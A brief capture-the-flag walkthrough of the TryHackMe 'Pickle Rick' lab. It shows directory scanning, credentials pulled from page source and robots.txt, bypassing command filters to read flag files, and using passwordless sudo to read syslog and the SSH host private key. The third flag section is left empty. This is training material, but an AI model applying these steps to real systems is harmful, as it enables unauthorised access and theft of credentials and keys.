# Pickle Rick

{% embed url="https://tryhackme.com/room/picklerick" %}

When reading the source code in `http://10.10.253.172/`, we found the following username: `R1ckRul3s`.

...

```bash
gobuster dir -u ... -w ...
...
/assets
/robots.txt
/.htaccess
/.htpasswd
...
```

...

```
$ ffuf -u http://10.10.253.172/FUZZ.php -w ...
```

...

From /robots.txt:

`Wubbalubbadubdub`

...

```bash
$ nikto -h http://<target_ip> -p 80
...
/login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
```

We found the path `/login.php` .



We are presented with a login page. The username and passsword are `R1ckRul3s` and `Wubbalubbadubdub`.

Comment found in `/portal.php`:

`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` .

...

_**First ingredient**_:

```bash
$ cat Sup3rS3cretPickl3Ingred.txt # does not work
$ more Sup3rS3cretPickl3Ingred.txt # does not work
$ less Sup3rS3cretPickl3Ingred.txt # WORKS!
mr. meeseek hair


```

_**Second ingredient**_:

```bash
$ ls /home
rick ubuntu

$ ls /home/rick
second ingredients

$ less '/home/rick/second ingredients' # 'more' and 'cat' disable
1 jerry tear

```



```bash
$ sudo -l

Matching Defaults entries for www-data on ip-10-10-49-150:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-49-150:
    (ALL) NOPASSWD: ALL
    
$ sudo less /var/log/syslog
...

$ ls -la /etc/ssh
...

$ sudo less /etc/ssh/ssh_host_rsa_key
...
```



_**Third ingredient**_:

```
$
```
